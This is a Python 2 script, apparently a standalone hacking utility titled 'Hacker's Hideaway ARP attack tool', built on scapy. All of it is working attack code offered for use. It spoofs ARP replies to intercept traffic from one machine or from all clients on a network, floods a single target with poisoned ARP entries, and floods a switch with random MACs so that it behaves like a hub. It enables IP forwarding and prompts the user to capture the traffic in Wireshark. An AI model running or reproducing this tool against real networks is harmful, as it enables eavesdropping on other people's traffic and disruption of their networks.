#! /usr/bin/env python
import getopt, sys, commands, signal, os
from scapy.all import *
os.system("clear")
print "************************************************"
print "**|''''''''''''''''''''''''''''''''''''''''''|**"
print "**|Hacker's Hideaway ARP attack tool         |**"
print "**|Version: 1 beta                           |**"
print "**|By: Anarchy Angel                         |**"
print "**|Email: anarchy.ang31 [@] gmail            |**"
print "**|http://hha.zapto.org                      |**"
print "**|-                                         |**"
print "**|Usage: $sudo python hharp.py -h           |**"
print "**|                                          |**"
print "**|,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|**"
print "************************************************"
print ""
try:
        opts, args = getopt.getopt(sys.argv[1:], "hm:r:t:d:s:")
except getopt.GetoptError, err:
        print str(err)
        exit()
for o, a in opts:
	if o in ("-h", "--help"):
		print "-h: This message."
		print "-m [1/2/3/4]:Choose witch mode to run the app in. 1 and 2 for passive modes, 3 for flood, 4 is switch attack."
		print "Mode 1 will attempt to MITM all clients on a network by replying to all ARP requests."
		print "Mode 2 is a targeted passive attack on a single machine."
		print "Mode 3 is a targeted flood attack on a single machine."
		print "Mode 4 will attempt to fill a switches ARP table turning it into a hub."
		print "-r [MAC]: The MAC you want traffic to be sent to for modes 1, 2, and 3."
		print "Use the -r flag only if you want packets from your target(s) to go to a machine other then your own."
		print "-t [IP]: Target for modes 2, 3, and 4. If used with mode 4 be sure its a switch."
		print "-d [IP]: Target destniation for mode 3"
		print "-s [MAC]: Used in mode 3 to replace the -t flag in case this tool cant get the targets mac from its ip."
		print "EXAMPLES:"
		print "$ sudo python hharp.py -m 1 <Will make a passive attempt to MITM all clients on the network>"
		exit()
        elif o in ("-m", "--mode"):
            	mode = a
	elif o in ("-r", "--remote-mac"):
	    	remote_mac = a
	elif o in ("-t", "--target"):
		target_ip = a
	elif o in ("-d", "--dest"):
		target_dest = a
	elif o in ("-s", "--tar-mac"):
		tar_mac = a
        else:
            	assert False, "unhandled option"
try:
	mode
except NameError:
	print "No mode set."
	print "Try -h"
	exit()
try:
	if mode == "1":
		print "Setting up forwarding..."
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding")
		forward = commands.getoutput("cat /proc/sys/net/ipv4/conf/all/forwarding")
		if forward != "1":
			print "Can't set up forwarding"
		print "Starting sniffer..."
		print "Now is a good time to open wireshark."
		print "Press Ctrl+c at anytime to stop the process"
		def arp_monitor_callback(pkt):
			if pkt.sprintf("%ARP.op%") == "who-has":
				print "Got who-has patcket..."
				source_ip = pkt.sprintf("%ARP.psrc%")
				print "From "+source_ip
				source_mac = pkt.sprintf("%ARP.hwsrc%")
				print "MAC - "+source_mac
				looking_for = pkt.sprintf("%ARP.pdst%")
				print source_ip+" is looking for "+looking_for
				print "Sending ARP attack packets..."
				try:
					sendp(Ether(dst=source_mac)/ARP(op=2, psrc=looking_for, hwsrc=remote_mac), count=10)
				except:
					sendp(Ether(dst=source_mac)/ARP(op=2, psrc=looking_for), count=10)
				print "\n"
		sniff(prn=arp_monitor_callback, filter="arp", store=0)
	elif mode == "2":
		try:
			target_ip
		except:
			print "-t flag not set."
			exit()
		print "Setting up forwarding..."
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding")
		forward = commands.getoutput("cat /proc/sys/net/ipv4/conf/all/forwarding")
		if forward != "1":
			print "Can't set up forwarding."
		print "Starting sniffer..."
		print "Now is a good time to start wireshark."
		def arp_monitor_callback(pkt):
			if pkt.sprintf("%ARP.op%") == "who-has":
				if pkt.sprintf("%ARP.psrc%") == target_ip:
					print "Got who-has patcket..."
					source_ip = pkt.sprintf("%ARP.psrc%")
					print "From "+source_ip
					source_mac = pkt.sprintf("%ARP.hwsrc%")
					print "MAC - "+source_mac
					looking_for = pkt.sprintf("%ARP.pdst%")
					print source_ip+" is looking for "+looking_for
					print "Sending ARP attack packets..."
					try:
						sendp(Ether(dst=source_mac)/ARP(op=2, psrc=looking_for, hwsrc=remote_mac), count=10)
					except:
						sendp(Ether(dst=source_mac)/ARP(op=2, psrc=looking_for), count=10)
					print "\n"
		sniff(prn=arp_monitor_callback, filter="arp", store=0)
	elif mode == "3":
		try:
			target_ip
		except:
			try:
				tar_mac
			except:
				print "The -t or -s flag must be set."
				exit()
		try:
			target_dest
		except:
			print "-d flag not set."
			exit()
		try:
			target_mac = tar_mac
		except:
			print "Getting MAC..."
			target_mac = getmacbyip(target_ip)
			if target_mac == None:
				print "Couldn't get targets MAC"
				print "Try replacing the -t flag with -s and the targets MAC."
				exit()
		print "Setting up forwarding..."
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding")
		forward = commands.getoutput("cat /proc/sys/net/ipv4/conf/all/forwarding")
		if forward != "1":
			print "Can't set up forwarding."
		print "Sending ARP attack packets to "+target_mac+" in batches of 10"
		print "To stop the flood press Ctrl+c"
		print "Now may be a good time to start wireshark."
		time.sleep(2)
		while 1:
			try:
				sendp(Ether(dst=target_mac)/ARP(op=2, psrc=target_dest, hwsrc=remote_mac), count=10)
			except:
				sendp(Ether(dst=target_mac)/ARP(op=2, psrc=target_dest), count=10)
	elif mode == "4":
		try:
			target_ip
		except:
			print "-t flag not set."
			exit()
		try:
			target_mac = tar_mac
		except:
			print "Getting MAC of switch..."
			target_mac = getmacbyip(target_ip)
			if target_mac == None:
				print "Couldn't get targets MAC"
				print "Try replacing the -t flag with -s and the targets MAC."
				exit()
		print "Starting to flood switch with random MAC addresses."
		print "Press Ctrl+c to stop the flood."
		while 1:
			sendp(Ether(dst=target_mac)/ARP(op=2, psrc=RandIP(), hwsrc=RandMAC()), count=3)
	else:
		print "There is no mode "+mode+" y0."
		print "Try -h"
		exit()
	raise KeyboardInterrupt()
except KeyboardInterrupt:
	print "\nWell i hope you had a good time."
	if mode == "4":
		print "k by."
		exit()
	else:
		print "Undoing routing config..."
		commands.getoutput("echo 0 > /proc/sys/net/ipv4/conf/all/forwarding")
		print "Done, k by."
		sys.exit()
